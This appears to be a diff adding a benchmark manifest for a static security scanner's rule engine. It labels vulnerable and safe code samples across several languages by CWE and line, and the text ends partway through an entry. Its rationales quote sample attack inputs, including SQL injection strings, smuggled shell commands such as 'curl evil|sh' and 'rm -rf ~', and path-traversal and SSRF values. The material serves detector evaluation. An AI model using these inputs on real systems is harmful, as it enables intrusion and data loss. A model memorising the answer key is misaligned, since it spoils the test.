@@ -1,0 +1,1390 @@
+{
+ "version": 1,
+ "scope": "The built-in rule engine of the analyzer (src/tools/static_scan.scan_material): no model, no network. Languages: those the engine has rules or detection for. Go has only the language-independent rules.",
+ "does_not_measure": "The hub's verdicts with a model: the model proposes and the rules decide there, and none of that is exercised here. A result in this set says what the rules alone do.",
+ "label_meaning": {
+  "dangerous": "contains at least one real, exploitable defect, listed under 'expected'",
+  "safe": "contains no defect of the classes in this set; may look like a dangerous example on purpose"
+ },
+ "criticality_meaning": {
+  "critical": "remote, unauthenticated code execution, full data read/write, or a live credential in source",
+  "high": "serious compromise that needs a precondition (a victim's browser, a reachable internal host, a file path)",
+  "medium": "weakens a defence or makes a later attack easier",
+  "low": "hardening gap",
+  "none": "safe example"
+ },
+ "expected_meaning": "cwe + line: a finding is a hit when it names the same CWE on the same line. line 0 means the defect belongs to the whole file and any line counts. Expectations were written from the code, not copied from the engine's output.",
+ "examples": [
+  {
+   "id": "py-sqli-fstring",
+   "file": "python/py_sqli_fstring.py",
+   "language": "python",
+   "label": "dangerous",
+   "criticality": "critical",
+   "expected": [
+    {
+     "cwe": "CWE-89",
+     "line": 11,
+     "why": "request argument inside the query text"
+    }
+   ],
+   "rationale": "A request argument is interpolated into the SQL text with an f-string. ?name=' OR '1'='1 returns every row; a stacked or UNION payload reads other tables. Remote, unauthenticated, full read of the database."
+  },
+  {
+   "id": "py-sqli-percent",
+   "file": "python/py_sqli_percent.py",
+   "language": "python",
+   "label": "dangerous",
+   "criticality": "critical",
+   "expected": [
+    {
+     "cwe": "CWE-89",
+     "line": 11,
+     "why": "% formatting is not parameter binding"
+    }
+   ],
+   "rationale": "% formatting builds the query string before the driver sees it, so it is string interpolation, not parameter binding (binding would pass the value as a second argument). order_id comes from the URL."
+  },
+  {
+   "id": "py-cmd-os-system",
+   "file": "python/py_cmd_os_system.py",
+   "language": "python",
+   "label": "dangerous",
+   "criticality": "critical",
+   "expected": [
+    {
+     "cwe": "CWE-78",
+     "line": 10,
+     "why": "user input reaches a shell command line"
+    }
+   ],
+   "rationale": "The host comes from the request and is concatenated into a shell command. host=8.8.8.8;cat /etc/passwd runs an arbitrary command as the service user."
+  },
+  {
+   "id": "py-cmd-subprocess-shell",
+   "file": "python/py_cmd_subprocess_shell.py",
+   "language": "python",
+   "label": "dangerous",
+   "criticality": "critical",
+   "expected": [
+    {
+     "cwe": "CWE-78",
+     "line": 10,
+     "why": "shell=True with user-controlled text"
+    }
+   ],
+   "rationale": "shell=True with an f-string that contains a user-controlled filename: a name such as 'a.png; curl evil|sh' executes a second command."
+  },
+  {
+   "id": "py-eval-input",
+   "file": "python/py_eval_input.py",
+   "language": "python",
+   "label": "dangerous",
+   "criticality": "critical",
+   "expected": [
+    {
+     "cwe": "CWE-95",
+     "line": 9,
+     "why": "request parameter evaluated as Python"
+    }
+   ],
+   "rationale": "eval() on a request parameter executes arbitrary Python: ?expr=__import__('os').system('id')."
+  },
+  {
+   "id": "py-pickle-cookie",
+   "file": "python/py_pickle_cookie.py",
+   "language": "python",
+   "label": "dangerous",
+   "criticality": "critical",
+   "expected": [
+    {
+     "cwe": "CWE-502",
+     "line": 11,
+     "why": "untrusted bytes unpickled"
+    }
+   ],
+   "rationale": "The session cookie is attacker-controlled and is unpickled; a crafted pickle runs code on load (__reduce__)."
+  },
+  {
+   "id": "py-aws-key",
+   "file": "python/py_aws_key.py",
+   "language": "python",
+   "label": "dangerous",
+   "criticality": "critical",
+   "expected": [
+    {
+     "cwe": "CWE-798",
+     "line": 3,
+     "why": "cloud access key id in source"
+    }
+   ],
+   "rationale": "A cloud access key id is committed in source. Anyone with read access to the repository (or a leaked container image) can use it. AKIAIOSFODNN7EXAMPLE is AWS's documented placeholder; the shape is what matters."
+  },
+  {
+   "id": "py-yaml-load",
+   "file": "python/py_yaml_load.py",
+   "language": "python",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-502",
+     "line": 9,
+     "why": "full YAML loader on untrusted input"
+    }
+   ],
+   "rationale": "yaml.load without a safe loader constructs arbitrary Python objects from the document; an uploaded config can execute code (!!python/object/apply)."
+  },
+  {
+   "id": "py-path-traversal",
+   "file": "python/py_path_traversal.py",
+   "language": "python",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-22",
+     "line": 11,
+     "why": "user-supplied path segment not confined"
+    }
+   ],
+   "rationale": "The file name from the query string is joined to the upload directory with no check that the result stays inside it: ?name=../../etc/passwd reads any file the service can read."
+  },
+  {
+   "id": "py-ssrf",
+   "file": "python/py_ssrf.py",
+   "language": "python",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-918",
+     "line": 10,
+     "why": "server-side request to a client-chosen URL"
+    }
+   ],
+   "rationale": "The server fetches any URL the client names, including http://169.254.169.254/ (cloud metadata) and internal hosts, and returns the body."
+  },
+  {
+   "id": "py-tls-verify-off",
+   "file": "python/py_tls_verify_off.py",
+   "language": "python",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-295",
+     "line": 7,
+     "why": "TLS verification disabled"
+    }
+   ],
+   "rationale": "Certificate verification is disabled for a call that carries an API token, so a network attacker can impersonate the server and read the token."
+  },
+  {
+   "id": "py-hardcoded-password",
+   "file": "python/py_hardcoded_password.py",
+   "language": "python",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-798",
+     "line": 4,
+     "why": "database password in source"
+    }
+   ],
+   "rationale": "The database password is a string literal in the source: it ships with every copy of the code and cannot be rotated without a release."
+  },
+  {
+   "id": "py-xss-flask",
+   "file": "python/py_xss_flask.py",
+   "language": "python",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-79",
+     "line": 9,
+     "why": "user input in HTML without escaping"
+    }
+   ],
+   "rationale": "The query parameter is concatenated into an HTML response with no escaping: ?name=<script>...</script> runs in the victim's browser (reflected XSS)."
+  },
+  {
+   "id": "py-ssti",
+   "file": "python/py_ssti.py",
+   "language": "python",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-1336",
+     "line": 9,
+     "why": "user input becomes template source"
+    }
+   ],
+   "rationale": "The template source itself is built from user input and rendered: {{ config }} leaks settings, and a gadget chain gives code execution (server-side template injection)."
+  },
+  {
+   "id": "py-idor",
+   "file": "python/py_idor.py",
+   "language": "python",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-639",
+     "line": 12,
+     "why": "no ownership check against current_user"
+    }
+   ],
+   "rationale": "The invoice is looked up by the id in the URL and returned without checking that it belongs to the logged-in user: changing the number reads other customers' invoices (insecure direct object reference). Needs semantic understanding of ownership; a line pattern cannot see it."
+  },
+  {
+   "id": "py-weak-hash-password",
+   "file": "python/py_weak_hash_password.py",
+   "language": "python",
+   "label": "dangerous",
+   "criticality": "medium",
+   "expected": [
+    {
+     "cwe": "CWE-327",
+     "line": 5,
+     "why": "MD5 used for password storage"
+    }
+   ],
+   "rationale": "Passwords are stored as unsalted MD5: fast to brute-force and rainbow-table friendly. A database leak turns into mass credential recovery."
+  },
+  {
+   "id": "py-insecure-random-token",
+   "file": "python/py_insecure_random_token.py",
+   "language": "python",
+   "label": "dangerous",
+   "criticality": "medium",
+   "expected": [
+    {
+     "cwe": "CWE-338",
+     "line": 7,
+     "why": "non-cryptographic PRNG for a security token"
+    }
+   ],
+   "rationale": "A password-reset token is drawn from the random module (Mersenne Twister): its state can be recovered from observed outputs, so tokens become predictable. secrets.token_urlsafe is the correct source."
+  },
+  {
+   "id": "py-debug-on",
+   "file": "python/py_debug_on.py",
+   "language": "python",
+   "label": "dangerous",
+   "criticality": "medium",
+   "expected": [
+    {
+     "cwe": "CWE-489",
+     "line": 12,
+     "why": "debug mode on a network-reachable server"
+    }
+   ],
+   "rationale": "The Flask debugger is enabled on a server that listens on all interfaces: the Werkzeug console allows code execution for anyone who can reach the port (and, if the PIN is guessable, without it)."
+  },
+  {
+   "id": "py-open-redirect",
+   "file": "python/py_open_redirect.py",
+   "language": "python",
+   "label": "dangerous",
+   "criticality": "medium",
+   "expected": [
+    {
+     "cwe": "CWE-601",
+     "line": 8,
+     "why": "redirect target taken from the request"
+    }
+   ],
+   "rationale": "After login the user is redirected to whatever ?next= says, so a phishing link on the real domain can send victims to an attacker's site."
+  },
+  {
+   "id": "py-safe-parametrized-sql",
+   "file": "python/py_safe_parametrized_sql.py",
+   "language": "python",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "The value is passed as a bound parameter (second argument), never spliced into the SQL text; the table and column names are fixed literals; the route requires a logged-in user."
+  },
+  {
+   "id": "py-safe-subprocess-list",
+   "file": "python/py_safe_subprocess_list.py",
+   "language": "python",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "No shell: arguments are a list, and the host is validated as an IP address before use, so there is nothing to inject into."
+  },
+  {
+   "id": "py-safe-yaml-json",
+   "file": "python/py_safe_yaml_json.py",
+   "language": "python",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "yaml.safe_load builds only plain data types; the JSON path is plain parsing. Neither can construct objects; the route requires a logged-in user."
+  },
+  {
+   "id": "py-safe-confined-path",
+   "file": "python/py_safe_confined_path.py",
+   "language": "python",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "The requested name is reduced to its base name and the resolved path is checked to be inside the upload directory before it is opened."
+  },
+  {
+   "id": "py-safe-secrets-from-env",
+   "file": "python/py_safe_secrets_from_env.py",
+   "language": "python",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "The password comes from the environment, tokens use the secrets module, and passwords are hashed with scrypt and a per-user random salt."
+  },
+  {
+   "id": "py-safe-outbound-allowlist",
+   "file": "python/py_safe_outbound_allowlist.py",
+   "language": "python",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "The fetched host must be on an allowlist, certificate verification is left on, the timeout is set, and the template is a file with autoescaping (the user text is data, not template source)."
+  },
+  {
+   "id": "js-sqli-concat",
+   "file": "javascript/js_sqli_concat.js",
+   "language": "javascript",
+   "label": "dangerous",
+   "criticality": "critical",
+   "expected": [
+    {
+     "cwe": "CWE-89",
+     "line": 7,
+     "why": "route parameter concatenated into SQL"
+    }
+   ],
+   "rationale": "The route parameter is concatenated into the SQL string: /users/1 OR 1=1 returns every user, and a UNION payload reads other tables."
+  },
+  {
+   "id": "js-cmd-exec",
+   "file": "javascript/js_cmd_exec.js",
+   "language": "javascript",
+   "label": "dangerous",
+   "criticality": "critical",
+   "expected": [
+    {
+     "cwe": "CWE-78",
+     "line": 7,
+     "why": "query parameter reaches a shell command"
+    }
+   ],
+   "rationale": "child_process.exec runs its argument through a shell; the directory comes from the query string, so ?dir=.;cat /etc/passwd executes a second command."
+  },
+  {
+   "id": "js-eval-body",
+   "file": "javascript/js_eval_body.js",
+   "language": "javascript",
+   "label": "dangerous",
+   "criticality": "critical",
+   "expected": [
+    {
+     "cwe": "CWE-95",
+     "line": 7,
+     "why": "request body evaluated as code"
+    }
+   ],
+   "rationale": "eval() on the request body executes arbitrary JavaScript in the server process."
+  },
+  {
+   "id": "js-xss-innerhtml",
+   "file": "javascript/js_xss_innerhtml.js",
+   "language": "javascript",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-79",
+     "line": 3,
+     "why": "URL fragment assigned to innerHTML"
+    }
+   ],
+   "rationale": "The URL fragment is written to innerHTML: a link ending in #<img src=x onerror=...> runs script in the page (DOM XSS)."
+  },
+  {
+   "id": "js-path-traversal",
+   "file": "javascript/js_path_traversal.js",
+   "language": "javascript",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-22",
+     "line": 8,
+     "why": "user-supplied path segment not confined"
+    }
+   ],
+   "rationale": "The file name from the URL is joined to a directory with no confinement: /files/..%2f..%2fetc/passwd reads files outside it."
+  },
+  {
+   "id": "js-jwt-none",
+   "file": "javascript/js_jwt_none.js",
+   "language": "javascript",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-347",
+     "line": 6,
+     "why": "unsigned tokens accepted"
+    }
+   ],
+   "rationale": "The token is verified with the 'none' algorithm allowed, so an attacker can forge a token with an empty signature and any claims."
+  },
+  {
+   "id": "js-tls-reject-off",
+   "file": "javascript/js_tls_reject_off.js",
+   "language": "javascript",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-295",
+     "line": 4,
+     "why": "certificate validation disabled"
+    }
+   ],
+   "rationale": "The HTTPS agent is told not to reject unauthorised certificates, so any certificate (including an attacker's) is accepted for requests that carry credentials."
+  },
+  {
+   "id": "js-math-random-token",
+   "file": "javascript/js_math_random_token.js",
+   "language": "javascript",
+   "label": "dangerous",
+   "criticality": "medium",
+   "expected": [
+    {
+     "cwe": "CWE-338",
+     "line": 2,
+     "why": "non-cryptographic PRNG for a session id"
+    }
+   ],
+   "rationale": "Session identifiers come from Math.random(), which is not cryptographically secure and is predictable once a few outputs are observed."
+  },
+  {
+   "id": "js-cors-any-credentials",
+   "file": "javascript/js_cors_any_credentials.js",
+   "language": "javascript",
+   "label": "dangerous",
+   "criticality": "medium",
+   "expected": [
+    {
+     "cwe": "CWE-942",
+     "line": 5,
+     "why": "any origin with credentials"
+    }
+   ],
+   "rationale": "Every origin is allowed and credentials are enabled, so any website can make authenticated calls on behalf of a logged-in visitor."
+  },
+  {
+   "id": "js-safe-parametrized-sql",
+   "file": "javascript/js_safe_parametrized_sql.js",
+   "language": "javascript",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "The id is passed as a bound parameter ($1) and the SQL text is a constant."
+  },
+  {
+   "id": "js-safe-execfile-allowlist",
+   "file": "javascript/js_safe_execfile_allowlist.js",
+   "language": "javascript",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "execFile takes an argument list and no shell; the directory must be one of a fixed set of names."
+  },
+  {
+   "id": "js-safe-textcontent",
+   "file": "javascript/js_safe_textcontent.js",
+   "language": "javascript",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "The fragment is written as text, not markup, so it cannot create elements or run script."
+  },
+  {
+   "id": "js-safe-crypto-session",
+   "file": "javascript/js_safe_crypto_session.js",
+   "language": "javascript",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "Identifiers come from the crypto module's CSPRNG; the JWT verification pins HS256 and reads the key from the environment; the file name is reduced to its base name."
+  },
+  {
+   "id": "ts-sqli-template",
+   "file": "typescript/ts_sqli_template.ts",
+   "language": "typescript",
+   "label": "dangerous",
+   "criticality": "critical",
+   "expected": [
+    {
+     "cwe": "CWE-89",
+     "line": 9,
+     "why": "request value inside a template-literal query"
+    }
+   ],
+   "rationale": "A template literal puts the request value straight into the SQL text, the TypeScript equivalent of string concatenation."
+  },
+  {
+   "id": "ts-cmd-exec-template",
+   "file": "typescript/ts_cmd_exec_template.ts",
+   "language": "typescript",
+   "label": "dangerous",
+   "criticality": "critical",
+   "expected": [
+    {
+     "cwe": "CWE-78",
+     "line": 8,
+     "why": "request value interpolated into a shell command"
+    }
+   ],
+   "rationale": "exec() receives a template literal that embeds a request value; the shell interprets it."
+  },
+  {
+   "id": "ts-reflected-xss",
+   "file": "typescript/ts_reflected_xss.ts",
+   "language": "typescript",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-79",
+     "line": 7,
+     "why": "request value in HTML without escaping"
+    }
+   ],
+   "rationale": "The query value is placed in an HTML response without escaping, so ?name=<script>... executes in the visitor's browser."
+  },
+  {
+   "id": "ts-hardcoded-jwt-secret",
+   "file": "typescript/ts_hardcoded_jwt_secret.ts",
+   "language": "typescript",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-798",
+     "line": 3,
+     "why": "token signing secret in source"
+    }
+   ],
+   "rationale": "The signing secret is a literal in the source; anyone who can read the code can mint valid tokens."
+  },
+  {
+   "id": "ts-safe-parametrized",
+   "file": "typescript/ts_safe_parametrized.ts",
+   "language": "typescript",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "Bound parameter, constant SQL text."
+  },
+  {
+   "id": "ts-safe-escaped-html",
+   "file": "typescript/ts_safe_escaped_html.ts",
+   "language": "typescript",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "The value is HTML-escaped before it is placed in markup."
+  },
+  {
+   "id": "ts-safe-env-secret",
+   "file": "typescript/ts_safe_env_secret.ts",
+   "language": "typescript",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "The signing key is read from the environment and the process refuses to start without it."
+  },
+  {
+   "id": "java-sqli-concat",
+   "file": "java/java_sqli_concat.java",
+   "language": "java",
+   "label": "dangerous",
+   "criticality": "critical",
+   "expected": [
+    {
+     "cwe": "CWE-89",
+     "line": 15,
+     "why": "parameter concatenated into SQL"
+    }
+   ],
+   "rationale": "The user name is concatenated into the SQL statement: name=' OR '1'='1 logs in as anyone or dumps the table."
+  },
+  {
+   "id": "java-cmd-runtime-exec",
+   "file": "java/java_cmd_runtime_exec.java",
+   "language": "java",
+   "label": "dangerous",
+   "criticality": "critical",
+   "expected": [
+    {
+     "cwe": "CWE-78",
+     "line": 5,
+     "why": "user input appended to a command line"
+    }
+   ],
+   "rationale": "The host is appended to a command string passed to Runtime.exec; on a platform that tokenises on spaces an attacker adds arguments, and wrappers such as sh -c make full injection trivial."
+  },
+  {
+   "id": "java-deserialize-request",
+   "file": "java/java_deserialize_request.java",
+   "language": "java",
+   "label": "dangerous",
+   "criticality": "critical",
+   "expected": [
+    {
+     "cwe": "CWE-502",
+     "line": 8,
+     "why": "untrusted stream deserialized"
+    }
+   ],
+   "rationale": "Java deserialization of the raw request body: a gadget chain on the classpath gives remote code execution."
+  },
+  {
+   "id": "java-xxe-default-parser",
+   "file": "java/java_xxe_default_parser.java",
+   "language": "java",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-611",
+     "line": 8,
+     "why": "XML parsed with external entities enabled"
+    }
+   ],
+   "rationale": "DocumentBuilderFactory is used with its defaults, so external entities and DTDs are resolved: a crafted XML reads local files or makes server-side requests (XXE)."
+  },
+  {
+   "id": "java-path-traversal",
+   "file": "java/java_path_traversal.java",
+   "language": "java",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-22",
+     "line": 7,
+     "why": "user-supplied file name not confined"
+    }
+   ],
+   "rationale": "The requested file name is appended to a base directory with no normalisation or containment check."
+  },
+  {
+   "id": "java-hardcoded-password",
+   "file": "java/java_hardcoded_password.java",
+   "language": "java",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-798",
+     "line": 2,
+     "why": "credential in source"
+    }
+   ],
+   "rationale": "The administrator password is a constant in the compiled class; it cannot be rotated without a release and is visible to anyone who can decompile the jar."
+  },
+  {
+   "id": "java-md5-password",
+   "file": "java/java_md5_password.java",
+   "language": "java",
+   "label": "dangerous",
+   "criticality": "medium",
+   "expected": [
+    {
+     "cwe": "CWE-327",
+     "line": 7,
+     "why": "MD5 for password hashing"
+    }
+   ],
+   "rationale": "MD5 is used to hash passwords: unsalted, fast, collision-broken."
+  },
+  {
+   "id": "java-safe-prepared-statement",
+   "file": "java/java_safe_prepared_statement.java",
+   "language": "java",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "PreparedStatement with a bound parameter; the SQL text is constant."
+  },
+  {
+   "id": "java-safe-processbuilder-validated",
+   "file": "java/java_safe_processbuilder_validated.java",
+   "language": "java",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "ProcessBuilder with separate arguments (no shell), and the host is parsed as an IP literal first."
+  },
+  {
+   "id": "java-safe-hardened-xml",
+   "file": "java/java_safe_hardened_xml.java",
+   "language": "java",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "The XML factory forbids DTDs and external entities before parsing."
+  },
+  {
+   "id": "java-safe-pbkdf2",
+   "file": "java/java_safe_pbkdf2.java",
+   "language": "java",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "Password hashing with PBKDF2 and a random per-password salt; the stored credential is read from configuration."
+  },
+  {
+   "id": "c-gets-overflow",
+   "file": "c/c_gets_overflow.c",
+   "language": "c",
+   "label": "dangerous",
+   "criticality": "critical",
+   "expected": [
+    {
+     "cwe": "CWE-242",
+     "line": 6,
+     "why": "unbounded read into a fixed buffer"
+    }
+   ],
+   "rationale": "gets() reads a line of unbounded length into a 64-byte buffer: any longer input overwrites the stack. The function was removed from the C standard because it cannot be used safely."
+  },
+  {
+   "id": "c-system-user-input",
+   "file": "c/c_system_user_input.c",
+   "language": "c",
+   "label": "dangerous",
+   "criticality": "critical",
+   "expected": [
+    {
+     "cwe": "CWE-78",
+     "line": 8,
+     "why": "user-controlled text passed to the shell"
+    }
+   ],
+   "rationale": "The host from the command line is formatted into a shell command and passed to system(): 'x; rm -rf ~' runs a second command."
+  },
+  {
+   "id": "c-strcpy-overflow",
+   "file": "c/c_strcpy_overflow.c",
+   "language": "c",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-120",
+     "line": 6,
+     "why": "unchecked copy into a fixed buffer"
+    }
+   ],
+   "rationale": "argv[1] is copied into a 16-byte buffer with strcpy, which does not check the length."
+  },
+  {
+   "id": "c-format-string",
+   "file": "c/c_format_string.c",
+   "language": "c",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-134",
+     "line": 4,
+     "why": "input used as a format string"
+    }
+   ],
+   "rationale": "Input is passed as the format string itself, so %x and %n let the sender read or write memory."
+  },
+  {
+   "id": "c-scanf-unbounded",
+   "file": "c/c_scanf_unbounded.c",
+   "language": "c",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-120",
+     "line": 5,
+     "why": "unbounded %s into a fixed buffer"
+    }
+   ],
+   "rationale": "scanf with a bare %s has no width limit and overflows the 32-byte buffer on long input."
+  },
+  {
+   "id": "c-use-after-free",
+   "file": "c/c_use_after_free.c",
+   "language": "c",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-416",
+     "line": 10,
+     "why": "write after free"
+    }
+   ],
+   "rationale": "The buffer is freed and then written through the same pointer. Needs lifetime reasoning; no single-line pattern identifies it."
+  },
+  {
+   "id": "c-malloc-overflow",
+   "file": "c/c_malloc_overflow.c",
+   "language": "c",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-190",
+     "line": 5,
+     "why": "multiplication can overflow before allocation"
+    }
+   ],
+   "rationale": "count * size can wrap around, so malloc returns a small buffer that the following loop overruns. Needs arithmetic reasoning."
+  },
+  {
+   "id": "c-safe-fgets",
+   "file": "c/c_safe_fgets.c",
+   "language": "c",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "Bounded read with fgets, and the output uses a constant format string."
+  },
+  {
+   "id": "c-safe-bounded-copy",
+   "file": "c/c_safe_bounded_copy.c",
+   "language": "c",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "Length is checked, the copy is bounded and terminated, and the format string is a literal."
+  },
+  {
+   "id": "c-safe-execvp",
+   "file": "c/c_safe_execvp.c",
+   "language": "c",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "No shell: the program and its arguments are passed to execvp separately, after the host is checked against a fixed character set."
+  },
+  {
+   "id": "cpp-strcpy-member",
+   "file": "cpp/cpp_strcpy_member.cpp",
+   "language": "cpp",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-120",
+     "line": 6,
+     "why": "unchecked copy into a fixed member buffer"
+    }
+   ],
+   "rationale": "strcpy into a fixed member array with a caller-supplied C string: overflows the object and its neighbours."
+  },
+  {
+   "id": "cpp-system-string",
+   "file": "cpp/cpp_system_string.cpp",
+   "language": "cpp",
+   "label": "dangerous",
+   "criticality": "critical",
+   "expected": [
+    {
+     "cwe": "CWE-78",
+     "line": 6,
+     "why": "user-influenced string executed by the shell"
+    }
+   ],
+   "rationale": "A std::string built from user input is handed to system(), which runs it through the shell."
+  },
+  {
+   "id": "cpp-format-string",
+   "file": "cpp/cpp_format_string.cpp",
+   "language": "cpp",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-134",
+     "line": 5,
+     "why": "message used as a format string"
+    }
+   ],
+   "rationale": "The message text is used as the printf format."
+  },
+  {
+   "id": "cpp-safe-std-string",
+   "file": "cpp/cpp_safe_std_string.cpp",
+   "language": "cpp",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "std::string manages its own storage, so there is no fixed buffer to overrun."
+  },
+  {
+   "id": "cpp-safe-literal-format",
+   "file": "cpp/cpp_safe_literal_format.cpp",
+   "language": "cpp",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "Constant format string; the message is passed as an argument."
+  },
+  {
+   "id": "php-sqli-concat",
+   "file": "php/php_sqli_concat.php",
+   "language": "php",
+   "label": "dangerous",
+   "criticality": "critical",
+   "expected": [
+    {
+     "cwe": "CWE-89",
+     "line": 3,
+     "why": "query parameter concatenated into SQL"
+    }
+   ],
+   "rationale": "The id from the query string is concatenated into the SQL text: ?id=1 OR 1=1 returns every row."
+  },
+  {
+   "id": "php-cmd-system",
+   "file": "php/php_cmd_system.php",
+   "language": "php",
+   "label": "dangerous",
+   "criticality": "critical",
+   "expected": [
+    {
+     "cwe": "CWE-78",
+     "line": 3,
+     "why": "request value appended to a shell command"
+    }
+   ],
+   "rationale": "system() with a request value appended: host=8.8.8.8;id runs a second command."
+  },
+  {
+   "id": "php-eval-post",
+   "file": "php/php_eval_post.php",
+   "language": "php",
+   "label": "dangerous",
+   "criticality": "critical",
+   "expected": [
+    {
+     "cwe": "CWE-95",
+     "line": 3,
+     "why": "request field evaluated as PHP"
+    }
+   ],
+   "rationale": "eval() on a POST field runs arbitrary PHP."
+  },
+  {
+   "id": "php-unserialize-cookie",
+   "file": "php/php_unserialize_cookie.php",
+   "language": "php",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-502",
+     "line": 2,
+     "why": "cookie data unserialized"
+    }
+   ],
+   "rationale": "unserialize() on a cookie lets the sender instantiate arbitrary classes and trigger magic methods (object injection)."
+  },
+  {
+   "id": "php-reflected-xss",
+   "file": "php/php_reflected_xss.php",
+   "language": "php",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-79",
+     "line": 3,
+     "why": "request value echoed into HTML"
+    }
+   ],
+   "rationale": "A query parameter is echoed into HTML without htmlspecialchars."
+  },
+  {
+   "id": "php-include-lfi",
+   "file": "php/php_include_lfi.php",
+   "language": "php",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-98",
+     "line": 3,
+     "why": "request-controlled include path"
+    }
+   ],
+   "rationale": "include() with a request-controlled path: ?page=../../etc/passwd (or a stream wrapper) includes arbitrary files."
+  },
+  {
+   "id": "php-safe-pdo",
+   "file": "php/php_safe_pdo.php",
+   "language": "php",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "PDO prepared statement with a bound parameter."
+  },
+  {
+   "id": "php-safe-escaped-output",
+   "file": "php/php_safe_escaped_output.php",
+   "language": "php",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "Output is escaped with htmlspecialchars; the page name is selected from a fixed list, not included from the request."
+  },
+  {
+   "id": "php-safe-json-escapeshellarg",
+   "file": "php/php_safe_json_escapeshellarg.php",
+   "language": "php",
+   "label": "safe",
+   "criticality": "none",
+   "expected": [],
+   "rationale": "Data is decoded as JSON (no object construction) and the one external argument is escaped with escapeshellarg."
+  },
+  {
+   "id": "go-sqli-concat",
+   "file": "go/go_sqli_concat.go",
+   "language": "go",
+   "label": "dangerous",
+   "criticality": "critical",
+   "expected": [
+    {
+     "cwe": "CWE-89",
+     "line": 11,
+     "why": "query parameter concatenated into SQL"
+    }
+   ],
+   "rationale": "The query parameter is concatenated into the SQL string passed to db.Query."
+  },
+  {
+   "id": "go-cmd-sh-c",
+   "file": "go/go_cmd_sh_c.go",
+   "language": "go",
+   "label": "dangerous",
+   "criticality": "critical",
+   "expected": [
+    {
+     "cwe": "CWE-78",
+     "line": 10,
+     "why": "request value interpolated into sh -c"
+    }
+   ],
+   "rationale": "The host goes into a string run by sh -c, so shell metacharacters in it are interpreted."
+  },
+  {
+   "id": "go-tls-skip-verify",
+   "file": "go/go_tls_skip_verify.go",
+   "language": "go",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-295",
+     "line": 11,
+     "why": "certificate validation disabled"
+    }
+   ],
+   "rationale": "InsecureSkipVerify disables certificate and host name validation for the client."
+  },
+  {
+   "id": "go-path-traversal",
+   "file": "go/go_path_traversal.go",
+   "language": "go",
+   "label": "dangerous",
+   "criticality": "high",
+   "expected": [
+    {
+     "cwe": "CWE-22",
+     "line": 10,
+     "why": "request value used as a path under the base"
+    }
+   ],
